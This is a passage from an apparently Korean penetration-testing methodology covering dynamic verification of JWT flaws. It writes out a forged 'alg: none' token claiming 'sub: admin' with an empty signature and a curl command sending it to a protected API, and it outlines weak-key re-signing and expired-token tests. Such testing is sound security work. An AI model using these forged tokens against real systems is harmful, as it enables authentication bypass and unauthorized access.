### Phase 2: 동적 테스트 (검증)


**Algorithm None 테스트:**
1. 유효한 JWT의 헤더를 `{"alg":"none","typ":"JWT"}`으로 변경
2. 페이로드를 원하는 대로 변조 (예: `sub`를 다른 사용자로 변경)
3. 서명 부분을 빈 문자열로 설정 (`header.payload.`)
4. 변조된 토큰으로 보호된 API 호출

```
# JWT 구성: base64url(header).base64url(payload).
# 헤더: {"alg":"none","typ":"JWT"}
# 페이로드: {"sub":"admin","iat":1234567890}
curl "https://target.com/api/protected" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0." -v
```

**약한 시크릿 키 테스트:**
소스코드에서 하드코딩된 키나 약한 키를 발견하면, 해당 키로 변조된 토큰에 서명하여 전송

**만료 토큰 테스트:**
`exp`가 과거 시간인 토큰을 전송하여 수락되는지 확인

**검증 기준:**
- **확인됨**: 동적 테스트로 변조된 토큰이 서버에서 수락되어 인증/인가가 우회된 것을 직접 확인함
